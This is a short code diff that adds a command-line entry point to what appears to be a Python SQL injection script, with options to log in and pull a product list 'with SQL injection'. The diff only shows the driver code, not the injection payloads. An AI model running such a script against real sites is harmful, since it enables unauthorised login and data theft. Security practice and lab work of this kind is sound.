@@ -51,3 +51,18 @@ def sql_login():
     logged_in, session = attempt_login(username, password)
 
     return logged_in, session
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--log_in', action='store_true', default=True, help='Log in with SQL injection')
+    parser.add_argument('--search', action='store_true', default=False, help='Obtain product list with SQL injection')
+    
+    args = parser.parse_args()
+
+    logged_in, session = sql_login()
+    products_list = sql_injection(session)
+    
+    print('Number of products: ', end='')
+    print(len(products_list))
+    
+    
